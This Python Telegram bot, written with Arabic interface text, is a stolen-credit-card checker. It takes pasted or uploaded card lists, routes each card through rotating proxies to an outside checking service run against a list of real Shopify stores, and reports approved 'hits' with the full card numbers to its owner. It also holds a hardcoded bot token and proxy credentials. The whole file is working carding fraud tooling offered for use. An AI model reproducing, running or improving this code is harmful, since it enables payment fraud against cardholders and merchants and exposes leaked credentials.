import telebot
from telebot import types
import requests
import re
import threading
import random
import time
import json
import os
from datetime import datetime
from collections import defaultdict

# ==================== التوكن والمتغيرات ====================
TOKEN = '8558756991:AAGlA5RUqv3QE75HKHXHNWcYTI0hcYyAy1M'
bot = telebot.TeleBot(TOKEN)
bot.remove_webhook()

OWNER_ID = 1013384909  # ضع معرفك هنا

# ==================== البروكسي الثابت ====================
FIXED_PROXY = "http://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:8080"

# ==================== ملفات التخزين ====================
SITES_FILE = "sites.json"
PROXIES_FILE = "proxies.json"
STATS_FILE = "stats.json"
SETTINGS_FILE = "settings.json"

# تحميل البيانات
def load_sites():
    if os.path.exists(SITES_FILE):
        with open(SITES_FILE, 'r') as f:
            return json.load(f)
    return [
        "https://makeship.com", "https://dutchwaregear.com", "https://sockbox.com",
        "https://www.nativecos.com", "https://www.tula.com", "https://drmtlgy.myshopify.com",
        "https://www.tula.com", "https://shop.wattlogic.com", "https://grabpick.com",
        "https://theneomag.com", "https://dominileather.com"
    ]

def save_sites(sites):
    with open(SITES_FILE, 'w') as f:
        json.dump(sites, f, indent=4)

def load_proxies():
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, 'r') as f:
            return json.load(f)
    return [FIXED_PROXY]

def save_proxies(proxies):
    with open(PROXIES_FILE, 'w') as f:
        json.dump(proxies, f, indent=4)

def load_stats():
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE, 'r') as f:
            return json.load(f)
    return {"total_checks": 0, "total_hits": 0, "total_dead": 0, "today_hits": 0, "today_date": datetime.now().strftime("%Y-%m-%d")}

def save_stats(stats):
    # reset daily stats if new day
    today = datetime.now().strftime("%Y-%m-%d")
    if stats.get("today_date") != today:
        stats["today_hits"] = 0
        stats["today_date"] = today
    with open(STATS_FILE, 'w') as f:
        json.dump(stats, f, indent=4)

def load_settings():
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r') as f:
            return json.load(f)
    return {"delay": 1, "timeout": 25, "auto_delete_bad_sites": True, "show_full_card": False}

def save_settings(settings):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f, indent=4)

# تحميل البيانات
SITES_LIST = load_sites()
PROXIES_LIST = load_proxies()
STATS_DATA = load_stats()
SETTINGS = load_settings()

# ==================== متغيرات الفحص ====================
checking_active = False
checking_thread = None
current_check = {
    "live": 0, "dead": 0, "total": 0, "current": 0,
    "last_card": "", "last_response": "", "last_site": "",
    "hits": [], "errors": [], "cards_left": []
}
site_errors = defaultdict(int)
proxy_errors = defaultdict(int)

# ==================== دوال مساعدة ====================
def make_request(site, card, proxy):
    """إرسال طلب مع البروكسي"""
    url = "https://web-production-a8008.up.railway.app/shopify"
    params = {"site": site, "cc": card, "proxy": proxy}
    
    session = requests.Session()
    session.proxies = {'http': proxy, 'https': proxy}
    session.headers.update({
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]),
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive'
    })
    
    try:
        start = time.time()
        response = session.get(url, params=params, timeout=SETTINGS.get("timeout", 25))
        elapsed = round(time.time() - start, 2)
        data = response.json()
        data["elapsed"] = elapsed
        return data
    except Exception as e:
        return {"Status": False, "Response": f"ERROR: {str(e)[:50]}", "elapsed": 0}
    finally:
        session.close()

def format_card(card, show_full=False):
    """تنسيق عرض البطاقة"""
    if show_full or SETTINGS.get("show_full_card", False):
        return card
    return card[:8] + "****" + card[-4:]

# ==================== الأزرار والقوائم ====================
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(
        types.InlineKeyboardButton("🚀 بدء الفحص", callback_data="start_check"),
        types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check")
    )
    markup.row(
        types.InlineKeyboardButton("📊 الإحصائيات", callback_data="show_stats"),
        types.InlineKeyboardButton("🌐 المواقع", callback_data="manage_sites")
    )
    markup.row(
        types.InlineKeyboardButton("🔌 البروكسيات", callback_data="manage_proxies"),
        types.InlineKeyboardButton("⚙️ الإعدادات", callback_data="settings")
    )
    markup.row(
        types.InlineKeyboardButton("📋 آخر الهيتات", callback_data="last_hits"),
        types.InlineKeyboardButton("⚠️ الأخطاء", callback_data="view_errors")
    )
    markup.row(
        types.InlineKeyboardButton("🔄 تحديث", callback_data="refresh")
    )
    return markup

def sites_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("➕ إضافة موقع", callback_data="add_site"))
    markup.add(types.InlineKeyboardButton("📋 قائمة المواقع", callback_data="list_sites"))
    markup.add(types.InlineKeyboardButton("🗑 حذف موقع", callback_data="delete_site"))
    markup.add(types.InlineKeyboardButton("🧹 مسح المواقع المعطلة", callback_data="clean_sites"))
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    return markup

def proxies_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("➕ إضافة بروكسي", callback_data="add_proxy"))
    markup.add(types.InlineKeyboardButton("📋 قائمة البروكسيات", callback_data="list_proxies"))
    markup.add(types.InlineKeyboardButton("🗑 حذف بروكسي", callback_data="delete_proxy"))
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    return markup

def settings_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    delay_status = "✅" if SETTINGS.get("delay", 1) == 1 else "⏱"
    auto_del_status = "✅" if SETTINGS.get("auto_delete_bad_sites", True) else "❌"
    show_card_status = "✅" if SETTINGS.get("show_full_card", False) else "❌"
    markup.add(types.InlineKeyboardButton(f"{delay_status} تأخير بين الطلبات: {SETTINGS.get('delay', 1)}ث", callback_data="set_delay"))
    markup.add(types.InlineKeyboardButton(f"{auto_del_status} حذف المواقع المعطلة تلقائياً", callback_data="toggle_auto_del"))
    markup.add(types.InlineKeyboardButton(f"{show_card_status} عرض البطاقة كاملة", callback_data="toggle_show_card"))
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    return markup

def checking_screen():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(
        types.InlineKeyboardButton("⏹ إيقاف", callback_data="stop_check"),
        types.InlineKeyboardButton("🔄 تحديث", callback_data="refresh_check")
    )
    return markup

# ==================== الأوامر ====================
@bot.message_handler(commands=['start'])
def start_cmd(m):
    if m.from_user.id != OWNER_ID:
        bot.reply_to(m, "⛔ هذا البوت خاص بصاحبه فقط")
        return
    
    # تحديث الإحصائيات اليومية
    global STATS_DATA
    STATS_DATA = load_stats()
    
    welcome_text = f"""
🤖 **بوت فحص Shopify - مصطفى النجم**

━━━━━━━━━━━━━━━━━━━
📊 **الإحصائيات العامة:**
• 🌐 مواقع نشطة: `{len(SITES_LIST)}`
• 🔌 بروكسيات: `{len(PROXIES_LIST)}`
• ✅ إجمالي الهيتات: `{STATS_DATA['total_hits']}`
• 📅 هيتات اليوم: `{STATS_DATA['today_hits']}`

━━━━━━━━━━━━━━━━━━━
⚙️ **الإعدادات:**
• ⏱ تأخير: `{SETTINGS.get('delay', 1)}` ثانية
• 🗑 حذف تلقائي: `{'نعم' if SETTINGS.get('auto_delete_bad_sites', True) else 'لا'}`

━━━━━━━━━━━━━━━━━━━
💬 أرسل كومبو أو ملف .txt لبدء الفحص
━━━━━━━━━━━━━━━━━━━
👨‍💻 @o8380
"""
    bot.send_message(m.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(commands=['addsite'])
def add_site_cmd(m):
    if m.from_user.id != OWNER_ID:
        return
    msg = bot.reply_to(m, "🌐 أرسل رابط الموقع:\nمثال: https://example.com")
    bot.register_next_step_handler(msg, save_new_site)

def save_new_site(m):
    site = m.text.strip()
    if not site.startswith("http"):
        site = "https://" + site
    if site not in SITES_LIST:
        SITES_LIST.append(site)
        save_sites(SITES_LIST)
        bot.reply_to(m, f"✅ تم إضافة الموقع:\n`{site}`", parse_mode="Markdown")
    else:
        bot.reply_to(m, "❌ الموقع موجود بالفعل")

@bot.message_handler(commands=['addproxy'])
def add_proxy_cmd(m):
    if m.from_user.id != OWNER_ID:
        return
    msg = bot.reply_to(m, "🔌 أرسل البروكسي:\nمثال: http://user:pass@host:port")
    bot.register_next_step_handler(msg, save_new_proxy)

def save_new_proxy(m):
    proxy = m.text.strip()
    if proxy not in PROXIES_LIST:
        PROXIES_LIST.append(proxy)
        save_proxies(PROXIES_LIST)
        bot.reply_to(m, f"✅ تم إضافة البروكسي:\n`{proxy[:50]}...`", parse_mode="Markdown")
    else:
        bot.reply_to(m, "❌ البروكسي موجود بالفعل")

@bot.message_handler(commands=['stats'])
def stats_cmd(m):
    if m.from_user.id != OWNER_ID:
        return
    show_stats_message(m.chat.id)

@bot.message_handler(commands=['sites'])
def sites_list_cmd(m):
    if m.from_user.id != OWNER_ID:
        return
    show_sites_list(m.chat.id)

@bot.message_handler(commands=['delsite'])
def del_site_cmd(m):
    if m.from_user.id != OWNER_ID:
        return
    args = m.text.split()
    if len(args) != 2:
        bot.reply_to(m, "❌ استخدم: /delsite [الموقع]")
        return
    site = args[1]
    if site in SITES_LIST:
        SITES_LIST.remove(site)
        save_sites(SITES_LIST)
        bot.reply_to(m, f"✅ تم حذف: `{site}`", parse_mode="Markdown")
    else:
        bot.reply_to(m, "❌ الموقع غير موجود")

@bot.message_handler(commands=['clean'])
def clean_sites_cmd(m):
    if m.from_user.id != OWNER_ID:
        return
    # فحص جميع المواقع وحذف المعطلة
    bot.reply_to(m, "🔄 جاري فحص المواقع...")
    working = []
    dead = []
    
    for site in SITES_LIST:
        try:
            res = requests.get(site, timeout=10)
            if res.status_code < 400:
                working.append(site)
            else:
                dead.append(site)
        except:
            dead.append(site)
    
    if dead:
        for site in dead:
            if site in SITES_LIST:
                SITES_LIST.remove(site)
        save_sites(SITES_LIST)
        bot.reply_to(m, f"✅ تم حذف {len(dead)} موقع معطل\n🗑 {', '.join(dead[:5])}")
    else:
        bot.reply_to(m, "✅ جميع المواقع تعمل بشكل جيد")

@bot.message_handler(content_types=['document', 'text'])
def handle_input(m):
    if m.from_user.id != OWNER_ID:
        return
    
    global checking_active, checking_thread
    
    if checking_active:
        bot.reply_to(m, "⚠️ يوجد فحص نشط حالياً! أوقف الفحص أولاً")
        return
    
    cards = []
    if m.content_type == 'text':
        if m.text.startswith('/'):
            return
        cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', m.text)
    else:
        try:
            file_info = bot.get_file(m.document.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', content)
        except Exception as e:
            bot.reply_to(m, f"❌ خطأ: {str(e)}")
            return
    
    if not cards:
        bot.reply_to(m, "❌ لم يتم العثور على بطاقات! الصيغة: xxxx|MM|YY|CVV")
        return
    
    total_cards = len(cards)
    global current_check
    current_check = {
        "live": 0, "dead": 0, "total": total_cards, "current": 0,
        "last_card": "", "last_response": "", "last_site": "",
        "hits": [], "errors": [], "cards_left": cards.copy()
    }
    site_errors.clear()
    
    msg = bot.send_message(m.chat.id, f"""
🚀 **بدء الفحص الشامل**
━━━━━━━━━━━━━━━━━━━
💳 عدد البطاقات: `{total_cards}`
🌐 مواقع متاحة: `{len(SITES_LIST)}`
🔌 بروكسيات: `{len(PROXIES_LIST)}`
━━━━━━━━━━━━━━━━━━━
⏳ جاري الفحص...
""", parse_mode="Markdown", reply_markup=checking_screen())
    
    checking_active = True
    checking_thread = threading.Thread(target=run_checking, args=(m.chat.id, msg.message_id, cards))
    checking_thread.start()

# ==================== وظيفة الفحص الرئيسية ====================
def run_checking(chat_id, msg_id, cards):
    global checking_active, current_check, STATS_DATA
    
    for idx, card in enumerate(cards):
        if not checking_active:
            bot.send_message(chat_id, "⏹ تم إيقاف الفحص")
            break
        
        if not SITES_LIST:
            bot.send_message(chat_id, "❌ لا توجد مواقع! أضف موقعاً باستخدام /addsite")
            break
        
        if not PROXIES_LIST:
            bot.send_message(chat_id, "❌ لا توجد بروكسيات! أضف بروكسياً باستخدام /addproxy")
            break
        
        site = random.choice(SITES_LIST)
        proxy = random.choice(PROXIES_LIST)
        current_check["current"] = idx + 1
        current_check["last_card"] = card
        current_check["last_site"] = site
        
        try:
            data = make_request(site, card, proxy)
            response_msg = str(data.get("Response", "N/A")).upper()
            elapsed = data.get("elapsed", 0)
            status = data.get("Status", False)
            
            current_check["last_response"] = response_msg
            
            success_keys = ["APPROVED", "SUCCESS", "FUNDS", "CHARGED", "DS_REQUIRED", "AUTHENTICATE", "AUTHORIZED", "INSUFFICIENT"]
            is_live = status == True or any(k in response_msg for k in success_keys)
            
            if is_live:
                current_check["live"] += 1
                STATS_DATA["total_hits"] += 1
                STATS_DATA["today_hits"] += 1
                save_stats(STATS_DATA)
                
                hit_msg = f"""
🎯 **HIT / APPROVED**
━━━━━━━━━━━━━━━━━━━
💳 **CC:** `{card}`
📝 **Response:** `{response_msg}`
🌐 **Site:** `{site}`
⏱ **Time:** `{elapsed}s`
━━━━━━━━━━━━━━━━━━━
✅ مصطفى النجم 🇮🇶
"""
                bot.send_message(chat_id, hit_msg, parse_mode="Markdown")
                current_check["hits"].insert(0, {"card": card, "response": response_msg, "site": site, "time": elapsed})
                if len(current_check["hits"]) > 20:
                    current_check["hits"].pop()
            else:
                current_check["dead"] += 1
                
                # حذف المواقع المعطلة تلقائياً
                if SETTINGS.get("auto_delete_bad_sites", True):
                    if "TIMEOUT" in response_msg or "CONNECTION" in response_msg or "500" in response_msg:
                        site_errors[site] += 1
                        if site_errors[site] >= 2 and site in SITES_LIST:
                            SITES_LIST.remove(site)
                            save_sites(SITES_LIST)
                            bot.send_message(chat_id, f"⚠️ تم حذف الموقع المعطل: `{site}`", parse_mode="Markdown")
                
                # تسجيل الأخطاء
                if "ERROR" in response_msg or "TIMEOUT" in response_msg:
                    error_msg = f"{card[:12]}***: {response_msg[:40]}"
                    current_check["errors"].insert(0, error_msg)
                    if len(current_check["errors"]) > 20:
                        current_check["errors"].pop()
            
            # تحديث شاشة التقدم
            if (idx + 1) % 3 == 0 or (idx + 1) == len(cards):
                progress = int((idx + 1) / len(cards) * 100)
                try:
                    bot.edit_message_text(f"""
🚀 **فحص Shopify - مصطفى النجم**
━━━━━━━━━━━━━━━━━━━
📊 **التقدم:** [{idx+1}/{len(cards)}] ({progress}%)
✅ **Approved:** `{current_check['live']}`
❌ **Declined:** `{current_check['dead']}`
━━━━━━━━━━━━━━━━━━━
💳 **آخر بطاقة:** `{format_card(card)}`
📝 **الرد:** `{current_check['last_response'][:35]}`
🌐 **الموقع:** `{site[:30]}`
━━━━━━━━━━━━━━━━━━━
🌐 **مواقع نشطة:** `{len(SITES_LIST)}`
🔌 **بروكسيات:** `{len(PROXIES_LIST)}`
━━━━━━━━━━━━━━━━━━━
⚡ @o8380
""", chat_id, msg_id, parse_mode="Markdown", reply_markup=checking_screen())
                except:
                    pass
            
        except Exception as e:
            current_check["dead"] += 1
            current_check["errors"].insert(0, f"{card}: {str(e)[:40]}")
        
        # تأخير بين الطلبات
        time.sleep(SETTINGS.get("delay", 1))
    
    checking_active = False
    
    # التقرير النهائي
    hit_rate = round(current_check['live'] / len(cards) * 100, 1) if cards else 0
    final_report = f"""
🏁 **تقرير الفحص النهائي**
━━━━━━━━━━━━━━━━━━━
📊 **إجمالي البطاقات:** `{len(cards)}`
✅ **Hits:** `{current_check['live']}`
❌ **Dead:** `{current_check['dead']}`
📈 **نسبة النجاح:** `{hit_rate}%`
━━━━━━━━━━━━━━━━━━━
🌐 **المواقع المتبقية:** `{len(SITES_LIST)}`
━━━━━━━━━━━━━━━━━━━
⚡ @o8380
"""
    bot.send_message(chat_id, final_report, parse_mode="Markdown", reply_markup=main_menu())
    
    # عرض آخر 5 هيتات
    if current_check["hits"]:
        hits_text = "📋 **آخر الهيتات:**\n━━━━━━━━━━━━━━━━━━━\n"
        for hit in current_check["hits"][:5]:
            hits_text += f"🎯 `{format_card(hit['card'])}` → {hit['response'][:20]}\n"
        bot.send_message(chat_id, hits_text, parse_mode="Markdown")

# ==================== دوال عرض المعلومات ====================
def show_stats_message(chat_id):
    hit_rate = 0
    if STATS_DATA["total_checks"] > 0:
        hit_rate = round(STATS_DATA["total_hits"] / STATS_DATA["total_checks"] * 100, 1)
    
    text = f"""
📊 **الإحصائيات العامة**
━━━━━━━━━━━━━━━━━━━
🔢 إجمالي الفحوصات: `{STATS_DATA['total_checks']}`
🎯 إجمالي الهيتات: `{STATS_DATA['total_hits']}`
📈 نسبة النجاح الكلية: `{hit_rate}%`
━━━━━━━━━━━━━━━━━━━
📅 هيتات اليوم: `{STATS_DATA['today_hits']}`
🌐 المواقع النشطة: `{len(SITES_LIST)}`
🔌 البروكسيات: `{len(PROXIES_LIST)}`
━━━━━━━━━━━━━━━━━━━
**آخر فحص:**
✅ Hits: `{current_check['live']}`
❌ Dead: `{current_check['dead']}`
"""
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=main_menu())

def show_sites_list(chat_id):
    if not SITES_LIST:
        bot.send_message(chat_id, "❌ لا توجد مواقع", reply_markup=sites_menu())
        return
    
    text = "🌐 **قائمة المواقع:**\n━━━━━━━━━━━━━━━━━━━\n"
    for i, site in enumerate(SITES_LIST, 1):
        text += f"{i}. `{site[:50]}`\n"
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=sites_menu())

def show_proxies_list(chat_id):
    if not PROXIES_LIST:
        bot.send_message(chat_id, "❌ لا توجد بروكسيات", reply_markup=proxies_menu())
        return
    
    text = "🔌 **قائمة البروكسيات:**\n━━━━━━━━━━━━━━━━━━━\n"
    for i, proxy in enumerate(PROXIES_LIST, 1):
        text += f"{i}. `{proxy[:60]}...`\n"
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=proxies_menu())

# ==================== معالجة الأزرار ====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global checking_active, STATS_DATA, SETTINGS
    
    if call.data == "start_check":
        bot.answer_callback_query(call.id, "📁 أرسل الكومبو أو ملف .txt")
        bot.send_message(call.message.chat.id, "📁 أرسل الكومبو أو الملف لبدء الفحص")
    
    elif call.data == "stop_check":
        checking_active = False
        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
        bot.edit_message_text("⏹ تم إيقاف الفحص", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
    
    elif call.data == "show_stats":
        show_stats_message(call.message.chat.id)
        bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "manage_sites":
        bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
    
    elif call.data == "manage_proxies":
        bot.edit_message_text("🔌 **إدارة البروكسيات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=proxies_menu())
    
    elif call.data == "settings":
        bot.edit_message_text("⚙️ **الإعدادات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=settings_menu())
    
    elif call.data == "list_sites":
        show_sites_list(call.message.chat.id)
        bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "list_proxies":
        show_proxies_list(call.message.chat.id)
        bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "add_site":
        bot.send_message(call.message.chat.id, "🌐 أرسل رابط الموقع:")
        bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "add_proxy":
        bot.send_message(call.message.chat.id, "🔌 أرسل البروكسي:")
        bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "delete_site":
        if SITES_LIST:
            markup = types.InlineKeyboardMarkup(row_width=1)
            for site in SITES_LIST[:15]:
                markup.add(types.InlineKeyboardButton(f"🗑 {site[:35]}", callback_data=f"del_site_{site}"))
            markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="manage_sites"))
            bot.edit_message_text("🗑 **اختر موقعاً للحذف:**", call.message.chat.id, call.message.message_id, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "❌ لا توجد مواقع")
    
    elif call.data == "delete_proxy":
        if PROXIES_LIST:
            markup = types.InlineKeyboardMarkup(row_width=1)
            for i, proxy in enumerate(PROXIES_LIST[:10]):
                short = proxy[:40] + "..." if len(proxy) > 40 else proxy
                markup.add(types.InlineKeyboardButton(f"🗑 {short}", callback_data=f"del_proxy_{i}"))
            markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="manage_proxies"))
            bot.edit_message_text("🗑 **اختر بروكسياً للحذف:**", call.message.chat.id, call.message.message_id, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "❌ لا توجد بروكسيات")
    
    elif call.data == "clean_sites":
        bot.answer_callback_query(call.id, "🔄 جاري التنظيف...")
        working = []
        dead = []
        for site in SITES_LIST:
            try:
                r = requests.get(site, timeout=10)
                if r.status_code < 400:
                    working.append(site)
                else:
                    dead.append(site)
            except:
                dead.append(site)
        for site in dead:
            if site in SITES_LIST:
                SITES_LIST.remove(site)
        save_sites(SITES_LIST)
        bot.answer_callback_query(call.id, f"✅ تم حذف {len(dead)} موقع معطل")
        bot.edit_message_text("🌐 **تم التنظيف**\n━━━━━━━━━━━━━━━━━━━\n" + f"🗑 تم حذف {len(dead)} موقع", call.message.chat.id, call.message.message_id, reply_markup=sites_menu())
    
    elif call.data == "last_hits":
        if current_check["hits"]:
            text = "📋 **آخر الهيتات:**\n━━━━━━━━━━━━━━━━━━━\n"
            for hit in current_check["hits"][:10]:
                text += f"🎯 `{format_card(hit['card'])}`\n📝 {hit['response'][:30]}\n🌐 {hit['site'][:30]}\n━━━━━━━━━━━━━━━━━━━\n"
            bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
        else:
            bot.answer_callback_query(call.id, "❌ لا توجد هيتات بعد")
    
    elif call.data == "view_errors":
        if current_check["errors"]:
            text = "⚠️ **أخر الأخطاء:**\n━━━━━━━━━━━━━━━━━━━\n"
            for err in current_check["errors"][:10]:
                text += f"❌ {err}\n"
            bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
        else:
            bot.answer_callback_query(call.id, "✅ لا توجد أخطاء")
    
    elif call.data == "set_delay":
        msg = bot.send_message(call.message.chat.id, "⏱ أدخل وقت التأخير بالثواني (1-10):")
        bot.register_next_step_handler(msg, set_delay_value)
        bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "toggle_auto_del":
        SETTINGS["auto_delete_bad_sites"] = not SETTINGS.get("auto_delete_bad_sites", True)
        save_settings(SETTINGS)
        bot.answer_callback_query(call.id, f"✅ تغيير: {'تشغيل' if SETTINGS['auto_delete_bad_sites'] else 'إيقاف'}")
        bot.edit_message_text("⚙️ **الإعدادات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=settings_menu())
    
    elif call.data == "toggle_show_card":
        SETTINGS["show_full_card"] = not SETTINGS.get("show_full_card", False)
        save_settings(SETTINGS)
        bot.answer_callback_query(call.id, f"✅ عرض البطاقة: {'كامل' if SETTINGS['show_full_card'] else 'مخفي'}")
        bot.edit_message_text("⚙️ **الإعدادات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=settings_menu())
    
    elif call.data.startswith("del_site_"):
        site = call.data[9:]
        if site in SITES_LIST:
            SITES_LIST.remove(site)
            save_sites(SITES_LIST)
            bot.answer_callback_query(call.id, "✅ تم الحذف")
            bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
    
    elif call.data.startswith("del_proxy_"):
        idx = int(call.data[10:])
        if idx < len(PROXIES_LIST):
            PROXIES_LIST.pop(idx)
            save_proxies(PROXIES_LIST)
            bot.answer_callback_query(call.id, "✅ تم الحذف")
            bot.edit_message_text("🔌 **إدارة البروكسيات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=proxies_menu())
    
    elif call.data == "refresh_check":
        bot.answer_callback_query(call.id, "🔄 تم التحديث")
    
    elif call.data == "refresh":
        bot.answer_callback_query(call.id, "🔄 تم التحديث")
        bot.edit_message_text("✅ تم التحديث", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
    
    elif call.data == "back":
        bot.edit_message_text("✅ الرئيسية", call.message.chat.id, call.message.message_id, reply_markup=main_menu())

def set_delay_value(m):
    try:
        delay = int(m.text.strip())
        if 1 <= delay <= 10:
            SETTINGS["delay"] = delay
            save_settings(SETTINGS)
            bot.reply_to(m, f"✅ تم ضبط التأخير إلى {delay} ثانية")
        else:
            bot.reply_to(m, "❌ القيمة يجب أن تكون بين 1 و 10")
    except:
        bot.reply_to(m, "❌ أدخل رقماً صحيحاً")

# ==================== تشغيل البوت ====================
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║              🤖 بوت فحص Shopify - مصطفى النجم 🤖              ║
║                                                              ║
║                  Developer: @o8380                          ║
║                  Version: 7.0 Professional                  ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    print(f"✅ المواقع المحملة: {len(SITES_LIST)}")
    print(f"✅ البروكسيات المحملة: {len(PROXIES_LIST)}")
    print(f"⚙️ التأخير بين الطلبات: {SETTINGS.get('delay', 1)} ثانية")
    print("🚀 البوت يعمل الآن...")
    
    bot.infinity_polling(timeout=30)
